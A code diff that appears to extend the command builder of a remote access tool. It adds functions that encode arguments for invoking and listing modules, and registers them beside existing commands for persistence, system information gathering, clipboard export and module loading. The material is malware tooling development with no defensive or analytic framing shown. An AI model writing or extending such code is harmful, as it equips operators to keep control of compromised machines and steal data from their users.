@@ -65,6 +65,16 @@ def craft_load_module(value_dict):
 
     return str("==")
 
+
+def craft_invoke_module(value_dict):
+    a = base64.b64encode(value_dict['args'].encode()).decode()
+    b = value_dict['type'] + a
+    return b
+
+
+def craft_list_modules(value_dict):
+    return str(value_dict['type'])
+
 #
 preprocessing = {
     "PS": craft_sound_file,
@@ -74,7 +84,9 @@ preprocessing = {
     "EP": craft_enable_persistence,
     "SI": craft_sys_info,
     "EC": craft_export_clipboard,
-    "LM": craft_load_module
+    "LM": craft_load_module,
+    "IM": craft_invoke_module,
+    "ML": craft_list_modules
     }
 
 
